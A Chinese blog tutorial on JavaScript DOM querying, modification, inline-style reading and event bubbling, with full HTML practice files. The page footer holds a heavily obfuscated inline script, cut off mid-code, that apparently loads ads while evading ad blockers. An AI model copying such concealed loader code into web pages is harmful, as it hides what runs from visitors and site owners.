两个属性作用类似，都可以获取到标签内部的内容，<br>             不同是innerHTML会获取到html标签，而innerText会自动去除标签<br>         - 如果使用这两个属性来设置标签内部的内容时，没有任何区别的    <br>         <br>     <strong>读取标签内部的文本内容</strong><br>         &lt;h1&gt;h1中的文本内容&lt;/h1&gt;<br>         元素.firstChild.nodeValue<br>         <br><strong>    - document对象的其他的属性和方法</strong><br>         document.all<br>             - 获取页面中的所有元素，相当于document.getElementsByTagName("*");<br>             <br>         document.documentElement<br>             - 获取页面中html根元素<br>             <br>         document.body<br>             - 获取页面中的body元素<br>             <br>         document.getElementsByClassName()<br>             - 根据元素的class属性值查询一组元素节点对象<br>             - 这个方法不支持IE8及以下的浏览器<br>             <br>         document.querySelector()<br>             - 根据CSS选择器去页面中查询一个元素<br>             - 如果匹配到的元素有多个，则它会返回查询到的第一个元素    <br>             <br>         document.querySelectorAll()    <br>             - 根据CSS选择器去页面中查询一组元素<br>             - 会将匹配到所有元素封装到一个数组中返回，即使只匹配到一个</p> 
</blockquote> 
<pre><code class="language-html">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
		&lt;title&gt;Untitled Document&lt;/title&gt;
		&lt;link rel="stylesheet" type="text/css" href="style/css.css" /&gt;
		&lt;script type="text/javascript"&gt;
		
			window.onload = function(){
				
				//为id为btn01的按钮绑定一个单击响应函数
				var btn01 = document.getElementById("btn01");
				btn01.onclick = function(){
					//查找#bj节点
					var bj = document.getElementById("bj");
					//打印bj
					//innerHTML 通过这个属性可以获取到元素内部的html代码
					alert(bj.innerHTML);
				};
				
				
				//为id为btn02的按钮绑定一个单击响应函数
				var btn02 = document.getElementById("btn02");
				btn02.onclick = function(){
					//查找所有li节点
					//getElementsByTagName()可以根据标签名来获取一组元素节点对象
					//这个方法会给我们返回一个类数组对象，所有查询到的元素都会封装到对象中
					//即使查询到的元素只有一个，也会封装到数组中返回
					var lis = document.getElementsByTagName("li");
					
					//打印lis
					//alert(lis.length);
					
					//变量lis
					for(var i=0 ; i&lt;lis.length ; i++){
						alert(lis[i].innerHTML);
					}
				};
				
				
				//为id为btn03的按钮绑定一个单击响应函数
				var btn03 = document.getElementById("btn03");
				btn03.onclick = function(){
					//查找name=gender的所有节点
					var inputs = document.getElementsByName("gender");
					
					//alert(inputs.length);
					
					for(var i=0 ; i&lt;inputs.length ; i++){
						/*
						 * innerHTML用于获取元素内部的HTML代码的
						 * 	对于自结束标签，这个属性没有意义
						 */
						//alert(inputs[i].innerHTML);
						/*
						 * 如果需要读取元素节点属性，
						 * 	直接使用 元素.属性名
						 * 		例子：元素.id 元素.name 元素.value
						 * 		注意：class属性不能采用这种方式，
						 * 			读取class属性时需要使用 元素.className
						 */
						alert(inputs[i].className);
					}
				};
				
				
				
				//查找#city下所有li节点
				//返回#city的所有子节点
				//返回#phone的第一个子节点
				//返回#bj的父节点
				//返回#android的前一个兄弟节点
				//读取#username的value属性值
				//设置#username的value属性值
				//返回#bj的文本值
				
			};
			
		
		&lt;/script&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;div id="total"&gt;
			&lt;div class="inner"&gt;
				&lt;p&gt;
					你喜欢哪个城市?
				&lt;/p&gt;

				&lt;ul id="city"&gt;
					&lt;li id="bj"&gt;北京&lt;/li&gt;
					&lt;li&gt;上海&lt;/li&gt;
					&lt;li&gt;东京&lt;/li&gt;
					&lt;li&gt;首尔&lt;/li&gt;
				&lt;/ul&gt;

				&lt;br&gt;
				&lt;br&gt;

				&lt;p&gt;
					你喜欢哪款单机游戏?
				&lt;/p&gt;

				&lt;ul id="game"&gt;
					&lt;li id="rl"&gt;红警&lt;/li&gt;
					&lt;li&gt;实况&lt;/li&gt;
					&lt;li&gt;极品飞车&lt;/li&gt;
					&lt;li&gt;魔兽&lt;/li&gt;
				&lt;/ul&gt;

				&lt;br /&gt;
				&lt;br /&gt;

				&lt;p&gt;
					你手机的操作系统是?
				&lt;/p&gt;

				&lt;ul id="phone"&gt;&lt;li&gt;IOS&lt;/li&gt;&lt;li id="android"&gt;Android&lt;/li&gt;&lt;li&gt;Windows Phone&lt;/li&gt;&lt;/ul&gt;
			&lt;/div&gt;

			&lt;div class="inner"&gt;
				gender:
				&lt;input class="hello" type="radio" name="gender" value="male"/&gt;
				Male
				&lt;input class="hello" type="radio" name="gender" value="female"/&gt;
				Female
				&lt;br&gt;
				&lt;br&gt;
				name:
				&lt;input type="text" name="name" id="username" value="abcde"/&gt;
			&lt;/div&gt;
		&lt;/div&gt;
		&lt;div id="btnList"&gt;
			&lt;div&gt;&lt;button id="btn01"&gt;查找#bj节点&lt;/button&gt;&lt;/div&gt;
			&lt;div&gt;&lt;button id="btn02"&gt;查找所有li节点&lt;/button&gt;&lt;/div&gt;
			&lt;div&gt;&lt;button id="btn03"&gt;查找name=gender的所有节点&lt;/button&gt;&lt;/div&gt;
			&lt;div&gt;&lt;button id="btn04"&gt;查找#city下所有li节点&lt;/button&gt;&lt;/div&gt;
			&lt;div&gt;&lt;button id="btn05"&gt;返回#city的所有子节点&lt;/button&gt;&lt;/div&gt;
			&lt;div&gt;&lt;button id="btn06"&gt;返回#phone的第一个子节点&lt;/button&gt;&lt;/div&gt;
			&lt;div&gt;&lt;button id="btn07"&gt;返回#bj的父节点&lt;/button&gt;&lt;/div&gt;
			&lt;div&gt;&lt;button id="btn08"&gt;返回#android的前一个兄弟节点&lt;/button&gt;&lt;/div&gt;
			&lt;div&gt;&lt;button id="btn09"&gt;返回#username的value属性值&lt;/button&gt;&lt;/div&gt;
			&lt;div&gt;&lt;button id="btn10"&gt;设置#username的value属性值&lt;/button&gt;&lt;/div&gt;
			&lt;div&gt;&lt;button id="btn11"&gt;返回#bj的文本值&lt;/button&gt;&lt;/div&gt;
		&lt;/div&gt;
	&lt;/body&gt;
&lt;/html&gt;
</code></pre> 
<pre><code class="language-html">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
		&lt;title&gt;Untitled Document&lt;/title&gt;
		&lt;link rel="stylesheet" type="text/css" href="style/css.css" /&gt;
		&lt;script type="text/javascript"&gt;
		
			/*
			 * 定义一个函数，专门用来为指定元素绑定单击响应函数
			 * 	参数：
			 * 		idStr 要绑定单击响应函数的对象的id属性值
			 * 		fun 事件的回调函数，当单击元素时，该函数将会被触发
			 */
			function myClick(idStr , fun){
				var btn = document.getElementById(idStr);
				btn.onclick = fun;
			}
		
			window.onload = function(){
				
				//为id为btn01的按钮绑定一个单击响应函数
				var btn01 = document.getElementById("btn01");
				btn01.onclick = function(){
					//查找#bj节点
					var bj = document.getElementById("bj");
					//打印bj
					//innerHTML 通过这个属性可以获取到元素内部的html代码
					alert(bj.innerHTML);
				};
				
				
				//为id为btn02的按钮绑定一个单击响应函数
				var btn02 = document.getElementById("btn02");
				btn02.onclick = function(){
					//查找所有li节点
					//getElementsByTagName()可以根据标签名来获取一组元素节点对象
					//这个方法会给我们返回一个类数组对象，所有查询到的元素都会封装到对象中
					//即使查询到的元素只有一个，也会封装到数组中返回
					var lis = document.getElementsByTagName("li");
					
					//打印lis
					//alert(lis.length);
					
					//变量lis
					for(var i=0 ; i&lt;lis.length ; i++){
						alert(lis[i].innerHTML);
					}
				};
				
				
				//为id为btn03的按钮绑定一个单击响应函数
				var btn03 = document.getElementById("btn03");
				btn03.onclick = function(){
					//查找name=gender的所有节点
					var inputs = document.getElementsByName("gender");
					
					//alert(inputs.length);
					
					for(var i=0 ; i&lt;inputs.length ; i++){
						/*
						 * innerHTML用于获取元素内部的HTML代码的
						 * 	对于自结束标签，这个属性没有意义
						 */
						//alert(inputs[i].innerHTML);
						/*
						 * 如果需要读取元素节点属性，
						 * 	直接使用 元素.属性名
						 * 		例子：元素.id 元素.name 元素.value
						 * 		注意：class属性不能采用这种方式，
						 * 			读取class属性时需要使用 元素.className
						 */
						alert(inputs[i].className);
					}
				};
				
				//为id为btn04的按钮绑定一个单击响应函数
				var btn04 = document.getElementById("btn04");
				btn04.onclick = function(){
					
					//获取id为city的元素
					var city = document.getElementById("city");
					
					//查找#city下所有li节点
					var lis = city.getElementsByTagName("li");
					
					for(var i=0 ; i&lt;lis.length ; i++){
						alert(lis[i].innerHTML);
					}
					
				};
				
				//为id为btn05的按钮绑定一个单击响应函数
				var btn05 = document.getElementById("btn05");
				btn05.onclick = function(){
					//获取id为city的节点
					var city = document.getElementById("city");
					//返回#city的所有子节点
					/*
					 * childNodes属性会获取包括文本节点在呢的所有节点
					 * 根据DOM标签标签间空白也会当成文本节点
					 * 注意：在IE8及以下的浏览器中，不会将空白文本当成子节点，
					 * 	所以该属性在IE8中会返回4个子元素而其他浏览器是9个
					 */
					var cns = city.childNodes;
					
					//alert(cns.length);
					
					/*for(var i=0 ; i&lt;cns.length ; i++){
						alert(cns[i]);
					}*/
					
					/*
					 * children属性可以获取当前元素的所有子元素
					 */
					var cns2 = city.children;
					alert(cns2.length);
				};
				
				//为id为btn06的按钮绑定一个单击响应函数
				var btn06 = document.getElementById("btn06");
				btn06.onclick = function(){
					//获取id为phone的元素
					var phone = document.getElementById("phone");
					//返回#phone的第一个子节点
					//phone.childNodes[0];
					//firstChild可以获取到当前元素的第一个子节点（包括空白文本节点）
					var fir = phone.firstChild;
					
					//firstElementChild获取当前元素的第一个子元素
					/*
					 * firstElementChild不支持IE8及以下的浏览器，
					 * 	如果需要兼容他们尽量不要使用
					 */
					//fir = phone.firstElementChild;
					
					alert(fir);
				};
				
				//为id为btn07的按钮绑定一个单击响应函数
				myClick("btn07",function(){
					
					//获取id为bj的节点
					var bj = document.getElementById("bj");
					
					//返回#bj的父节点
					var pn = bj.parentNode;
					
					alert(pn.innerHTML);
					
					/*
					 * innerText
					 * 	- 该属性可以获取到元素内部的文本内容
					 * 	- 它和innerHTML类似，不同的是它会自动将html去除
					 */
					//alert(pn.innerText);
					
					
				});
				
				
				//为id为btn08的按钮绑定一个单击响应函数
				myClick("btn08",function(){
					
					//获取id为android的元素
					var and = document.getElementById("android");
					
					//返回#android的前一个兄弟节点（也可能获取到空白的文本）
					var ps = and.previousSibling;
					
					//previousElementSibling获取前一个兄弟元素，IE8及以下不支持
					//var pe = and.previousElementSibling;
					
					alert(ps);
					
				});
				
				//读取#username的value属性值
				myClick("btn09",function(){
					//获取id为username的元素
					var um = document.getElementById("username");
					//读取um的value属性值
					//文本框的value属性值，就是文本框中填写的内容
					alert(um.value);
				});
				
				
				//设置#username的value属性值
				myClick("btn10",function(){
					//获取id为username的元素
					var um = document.getElementById("username");
					
					um.value = "今天天气真不错~~~";
				});
				
				
				//返回#bj的文本值
				myClick("btn11",function(){
					
					//获取id为bj的元素
					var bj = document.getElementById("bj");
					
					//alert(bj.innerHTML);
					//alert(bj.innerText);
					
					//获取bj中的文本节点
					/*var fc = bj.firstChild;
					alert(fc.nodeValue);*/
					
					alert(bj.firstChild.nodeValue);
					
					
				});
				
			};
			
		
		&lt;/script&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;div id="total"&gt;
			&lt;div class="inner"&gt;
				&lt;p&gt;
					你喜欢哪个城市?
				&lt;/p&gt;

				&lt;ul id="city"&gt;
					&lt;li id="bj"&gt;北京&lt;/li&gt;
					&lt;li&gt;上海&lt;/li&gt;
					&lt;li&gt;东京&lt;/li&gt;
					&lt;li&gt;首尔&lt;/li&gt;
				&lt;/ul&gt;

				&lt;br&gt;
				&lt;br&gt;

				&lt;p&gt;
					你喜欢哪款单机游戏?
				&lt;/p&gt;

				&lt;ul id="game"&gt;
					&lt;li id="rl"&gt;红警&lt;/li&gt;
					&lt;li&gt;实况&lt;/li&gt;
					&lt;li&gt;极品飞车&lt;/li&gt;
					&lt;li&gt;魔兽&lt;/li&gt;
				&lt;/ul&gt;

				&lt;br /&gt;
				&lt;br /&gt;

				&lt;p&gt;
					你手机的操作系统是?
				&lt;/p&gt;

				&lt;ul id="phone"&gt;&lt;li&gt;IOS&lt;/li&gt; &lt;li id="android"&gt;Android&lt;/li&gt;&lt;li&gt;Windows Phone&lt;/li&gt;&lt;/ul&gt;
			&lt;/div&gt;

			&lt;div class="inner"&gt;
				gender:
				&lt;input class="hello" type="radio" name="gender" value="male"/&gt;
				Male
				&lt;input class="hello" type="radio" name="gender" value="female"/&gt;
				Female
				&lt;br&gt;
				&lt;br&gt;
				name:
				&lt;input type="text" name="name" id="username" value="abcde"/&gt;
			&lt;/div&gt;
		&lt;/div&gt;
		&lt;div id="btnList"&gt;
			&lt;div&gt;&lt;button id="btn01"&gt;查找#bj节点&lt;/button&gt;&lt;/div&gt;
			&lt;div&gt;&lt;button id="btn02"&gt;查找所有li节点&lt;/button&gt;&lt;/div&gt;
			&lt;div&gt;&lt;button id="btn03"&gt;查找name=gender的所有节点&lt;/button&gt;&lt;/div&gt;
			&lt;div&gt;&lt;button id="btn04"&gt;查找#city下所有li节点&lt;/button&gt;&lt;/div&gt;
			&lt;div&gt;&lt;button id="btn05"&gt;返回#city的所有子节点&lt;/button&gt;&lt;/div&gt;
			&lt;div&gt;&lt;button id="btn06"&gt;返回#phone的第一个子节点&lt;/button&gt;&lt;/div&gt;
			&lt;div&gt;&lt;button id="btn07"&gt;返回#bj的父节点&lt;/button&gt;&lt;/div&gt;
			&lt;div&gt;&lt;button id="btn08"&gt;返回#android的前一个兄弟节点&lt;/button&gt;&lt;/div&gt;
			&lt;div&gt;&lt;button id="btn09"&gt;返回#username的value属性值&lt;/button&gt;&lt;/div&gt;
			&lt;div&gt;&lt;button id="btn10"&gt;设置#username的value属性值&lt;/button&gt;&lt;/div&gt;
			&lt;div&gt;&lt;button id="btn11"&gt;返回#bj的文本值&lt;/button&gt;&lt;/div&gt;
		&lt;/div&gt;
	&lt;/body&gt;
&lt;/html&gt;
</code></pre> 
<p>全选练习：</p> 
<pre><code class="language-html">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
&lt;title&gt;全选练习&lt;/title&gt;
&lt;script type="text/javascript"&gt;

	window.onload = function(){
		
		//获取四个多选框items
		var items = document.getElementsByName("items");
		//获取全选/全不选的多选框
		var checkedAllBox = document.getElementById("checkedAllBox");
		
		/*
		 * 全选按钮
		 * 	- 点击按钮以后，四个多选框全都被选中
		 */
		
		//1.#checkedAllBtn
		//为id为checkedAllBtn的按钮绑定一个单击响应函数
		var checkedAllBtn = document.getElementById("checkedAllBtn");
		checkedAllBtn.onclick = function(){
			
			//遍历items
			for(var i=0 ; i&lt;items.length ; i++){
				
				//通过多选框的checked属性可以来获取或设置多选框的选中状态
				//alert(items[i].checked);
				
				//设置四个多选框变成选中状态
				items[i].checked = true;
			}
			
			//将全选/全不选设置为选中
			checkedAllBox.checked = true;
			
		};
		
		/*
		 * 全不选按钮
		 * 	- 点击按钮以后，四个多选框都变成没选中的状态
		 */
		//2.#checkedNoBtn
		//为id为checkedNoBtn的按钮绑定一个单击响应函数
		var checkedNoBtn = document.getElementById("checkedNoBtn");
		checkedNoBtn.onclick = function(){
			for(var i=0; i&lt;items.length ; i++){
				//将四个多选框设置为没选中的状态
				items[i].checked = false;
			}
			
			//将全选/全不选设置为不选中
			checkedAllBox.checked = false;
			
		};
		
		/*
		 * 反选按钮
		 * 	- 点击按钮以后，选中的变成没选中，没选中的变成选中
		 */
		//3.#checkedRevBtn
		var checkedRevBtn = document.getElementById("checkedRevBtn");
		checkedRevBtn.onclick = function(){
			
			//将checkedAllBox设置为选中状态
			checkedAllBox.checked = true;
			
			for(var i=0; i&lt;items.length ; i++){
				
				//判断多选框状态
				/*if(items[i].checked){
					//证明多选框已选中，则设置为没选中状态
					items[i].checked = false;
				}else{
					//证明多选框没选中，则设置为选中状态
					items[i].checked = true;
				}*/
				
				items[i].checked = !items[i].checked;
				
				//判断四个多选框是否全选
				//只要有一个没选中则就不是全选
				if(!items[i].checked){
					//一旦进入判断，则证明不是全选状态
					//将checkedAllBox设置为没选中状态
					checkedAllBox.checked = false;
				}
			}
			//在反选时也需要判断四个多选框是否全都选中
			
		};
		
		/*
		 * 提交按钮：
		 * 	- 点击按钮以后，将所有选中的多选框的value属性值弹出
		 */
		//4.#sendBtn
		//为sendBtn绑定单击响应函数
		var sendBtn = document.getElementById("sendBtn");
		sendBtn.onclick = function(){
			//遍历items
			for(var i=0 ; i&lt;items.length ; i++){
				//判断多选框是否选中
				if(items[i].checked){
					alert(items[i].value);
				}
			}
		};
		
		//5.#checkedAllBox
		/*
		 * 全选/全不选 多选框
		 * 	- 当它选中时，其余的也选中，当它取消时其余的也取消
		 * 
		 * 在事件的响应函数中，响应函数是给谁绑定的this就是谁
		 */
		//为checkedAllBox绑定单击响应函数
		checkedAllBox.onclick = function(){
			
			//alert(this === checkedAllBox);
			
			//设置多选框的选中状态
			for(var i=0; i &lt;items.length ; i++){
				items[i].checked = this.checked;
			}
			
		};
		
		//6.items
		/*
		 * 如果四个多选框全都选中，则checkedAllBox也应该选中
		 * 如果四个多选框没都选中，则checkedAllBox也不应该选中
		 */
		
		//为四个多选框分别绑定点击响应函数
		for(var i=0 ; i&lt;items.length ; i++){
			items[i].onclick = function(){
				
				//将checkedAllBox设置为选中状态
				checkedAllBox.checked = true;
				
				for(var j=0 ; j&lt;items.length ; j++){
					//判断四个多选框是否全选
					//只要有一个没选中则就不是全选
					if(!items[j].checked){
						//一旦进入判断，则证明不是全选状态
						//将checkedAllBox设置为没选中状态
						checkedAllBox.checked = false;
						//一旦进入判断，则已经得出结果，不用再继续执行循环
						break;
					}
				}
			};
		}
	};
	
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;

	&lt;form method="post" action=""&gt;
		你爱好的运动是？&lt;input type="checkbox" id="checkedAllBox" /&gt;全选/全不选 
		
		&lt;br /&gt;
		&lt;input type="checkbox" name="items" value="足球" /&gt;足球
		&lt;input type="checkbox" name="items" value="篮球" /&gt;篮球
		&lt;input type="checkbox" name="items" value="羽毛球" /&gt;羽毛球
		&lt;input type="checkbox" name="items" value="乒乓球" /&gt;乒乓球
		&lt;br /&gt;
		&lt;input type="button" id="checkedAllBtn" value="全　选" /&gt;
		&lt;input type="button" id="checkedNoBtn" value="全不选" /&gt;
		&lt;input type="button" id="checkedRevBtn" value="反　选" /&gt;
		&lt;input type="button" id="sendBtn" value="提　交" /&gt;
	&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre> 
<p>dom查询的其他方法：</p> 
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset="UTF-8"&gt;
		&lt;title&gt;&lt;/title&gt;
		&lt;script type="text/javascript"&gt;
			
			window.onload = function(){
				
				//获取body标签
				//var body = document.getElementsByTagName("body")[0];
				
				/*
				 * 在document中有一个属性body，它保存的是body的引用
				 */
				var body = document.body;
				
				/*
				 * document.documentElement保存的是html根标签
				 */
				var html = document.documentElement;
				
				//console.log(html);
				
				/*
				 * document.all代表页面中所有的元素
				 */
				var all = document.all;
				
				//console.log(all.length);
				
				/*for(var i=0 ; i&lt;all.length ; i++){
					console.log(all[i]);
				}*/
				
				//all = document.getElementsByTagName("*");
				//console.log(all.length);
				
				/*
				 * 根据元素的class属性值查询一组元素节点对象
				 * getElementsByClassName()可以根据class属性值获取一组元素节点对象，
				 * 	但是该方法不支持IE8及以下的浏览器
				 */
				//var box1 = document.getElementsByClassName("box1");
				//console.log(box1.length);
				
				//获取页面中的所有的div
				//var divs = document.getElementsByTagName("div");
				
				//获取class为box1中的所有的div
				//.box1 div
				/*
				 * document.querySelector()
				 * 	- 需要一个选择器的字符串作为参数，可以根据一个CSS选择器来查询一个元素节点对象
				 * 	- 虽然IE8中没有getElementsByClassName()但是可以使用querySelector()代替
				 * 	- 使用该方法总会返回唯一的一个元素，如果满足条件的元素有多个，那么它只会返回第一个
				 */
				var div = document.querySelector(".box1 div");
				
				var box1 = document.querySelector(".box1")
				
				//console.log(div.innerHTML);
				//console.log(box1.innerHTML);
				
				/*
				 * document.querySelectorAll()
				 * 	- 该方法和querySelector()用法类似，不同的是它会将符合条件的元素封装到一个数组中返回
				 * 	- 即使符合条件的元素只有一个，它也会返回数组
				 */
				box1 = document.querySelectorAll(".box1");
				box1 = document.querySelectorAll("#box2");
				console.log(box1);
				
			};
			
		&lt;/script&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;div id="box2"&gt;&lt;/div&gt;	
		&lt;div class="box1"&gt;
			我是第一个box1	 
			&lt;div&gt;我是box1中的div&lt;/div&gt;
		&lt;/div&gt;
		&lt;div class="box1"&gt;
			&lt;div&gt;我是box1中的div&lt;/div&gt;
		&lt;/div&gt;
		&lt;div class="box1"&gt;
			&lt;div&gt;我是box1中的div&lt;/div&gt;
		&lt;/div&gt;
		&lt;div class="box1"&gt;
			&lt;div&gt;我是box1中的div&lt;/div&gt;
		&lt;/div&gt;
		
		&lt;div&gt;&lt;/div&gt;
	&lt;/body&gt;
&lt;/html&gt;
</code></pre> 
<h3><span style="color:#fe2c24;">3.17 DOM 修改</span></h3> 
<blockquote> 
 <p>    document.createElement()<br>         - 可以根据标签名创建一个元素节点对象<br>         <br>     document.createTextNode()<br>         - 可以根据文本内容创建一个文本节点对象<br>         <br>     父节点.appendChild(子节点)<br>         - 向父节点中添加指定的子节点<br>         <br>     父节点.insertBefore(新节点,旧节点)<br>         - 将一个新的节点插入到旧节点的前边<br>         <br>     父节点.replaceChild(新节点,旧节点)<br>         - 使用一个新的节点去替换旧节点<br>         <br>     父节点.removeChild(子节点)<br>         - 删除指定的子节点<br>         - 推荐方式：子节点.parentNode.removeChild(子节点)</p> 
</blockquote> 
<h3>3.18 DOM 对 CSS 的操作</h3> 
<blockquote> 
 <p><strong>    - 读取和修改内联样式</strong><br>         - 使用style属性来操作元素的内联样式<br>         - 读取内联样式：<br>             语法：元素.style.样式名<br>             - 例子：<br>                 元素.style.width<br>                 元素.style.height<br>                 - 注意：如果样式名中带有-，则需要将样式名修改为驼峰命名法。将-去掉，然后-后的字母改大写<br>                 - 比如：background-color --&gt; backgroundColor<br>                         border-width ---&gt; borderWidth<br>                         <br>         - 修改内联样式：<br>             语法：元素.style.样式名 = 样式值<br>             - 通过style修改的样式都是内联样式，由于内联样式的优先级比较高，<br>                 所以我们通过JS来修改的样式，往往会立即生效，<br>                 但是如果样式中设置了!important，则内联样式将不会生效。<br>                 <br><strong>    - 读取元素的当前样式</strong><br>         - 正常浏览器<br>             - 使用getComputedStyle()<br>             - 这个方法是window对象的方法，可以返回一个对象，这个对象中保存着当前元素生效样式<br>             - 参数：<br>                 1.要获取样式的元素<br>                 2.可以传递一个伪元素，一般传null<br>             - 例子：<br>                 获取元素的宽度<br>                     getComputedStyle(box , null)["width"];<br>             - 通过该方法读取到样式都是只读的不能修改</p> 
 <p>        - IE8<br>             - 使用currentStyle<br>             - 语法：<br>                 元素.currentStyle.样式名<br>             - 例子：<br>                 box.currentStyle["width"]<br>             - 通过这个属性读取到的样式是只读的不能修改</p> 
 <p>    </p> 
 <p><strong>    - 其他的样式相关的属性</strong><br>         注意：以下样式都是只读的<br>     <br>         clientHeight<br>             - 元素的可见高度，指元素的内容区和内边距的高度<br>         clientWidth<br>             - 元素的可见宽度，指元素的内容区和内边距的宽度<br>         offsetHeight<br>             - 整个元素的高度，包括内容区、内边距、边框<br>         offfsetWidth<br>             - 整个元素的宽度，包括内容区、内边距、边框<br>         offsetParent<br>             - 当前元素的定位父元素<br>             - 离他最近的开启了定位的祖先元素，如果所有的元素都没有开启定位，则返回body<br>         offsetLeft<br>         offsetTop<br>             - 当前元素和定位父元素之间的偏移量<br>             - offsetLeft水平偏移量  offsetTop垂直偏移量<br>         <br>         scrollHeight<br>         scrollWidth<br>             - 获取元素滚动区域的高度和宽度<br>         <br>         scrollTop<br>         scrollLeft<br>             - 获取元素垂直和水平滚动条滚动的距离<br>             <br>         判断滚动条是否滚动到底<br>             - 垂直滚动条<br>                 scrollHeight - scrollTop = clientHeight<br>                 <br>             - 水平滚动    <br>                 scrollWidth - scrollLeft = clientWidth</p> 
</blockquote> 
<h3>3.19 事件</h3> 
<blockquote> 
 <p><strong>    - 事件对象</strong><br>     - 当响应函数被调用时，浏览器每次都会将一个事件对象作为实参传递进响应函数中，这个事件对象中封装了当前事件的相关信息，比如：鼠标的坐标，键盘的按键，鼠标的按键，滚轮的方向。。<br>     - 可以在响应函数中定义一个形参，来使用事件对象，但是在IE8以下浏览器中事件对象没有做完实参传递，而是作为window对象的属性保存。<br>         - 例子：<br>             元素.事件 = function(event){<!-- --><br>                 event = event || window.event;<br>                 <br>             };<br>             <br>             元素.事件 = function(e){<!-- --><br>                 e = e || event;<br>                 <br>             };<br>             <br><strong>    - 事件的冒泡（Bubble）</strong><br>     - 事件的冒泡指的是事件向上传导，当后代元素上的事件被触发时，将会导致其祖先元素上的同类事件也会触发。<br>     - 事件的冒泡大部分情况下都是有益的，如果需要取消冒泡，则需要使用事件对象来取消<br>     - 可以将事件对象的cancelBubble设置为true，即可取消冒泡<br>         - 例子：<br>                 元素.事件 = function(event){<!-- --><br>                     event = event || window.event;<br>                     event.cancelBubble = true;<br>                 };</p> 
</blockquote> 
<p></p> 
<p></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/96bc478460f3a29f5247982066390b7e/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">JVM源码剖析之registerNatives方法</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/5a1277552462a5b6c40b2972cdf03be6/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">multiplicity连接出现灰色解决方法（一套键鼠控制多台电脑）</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var 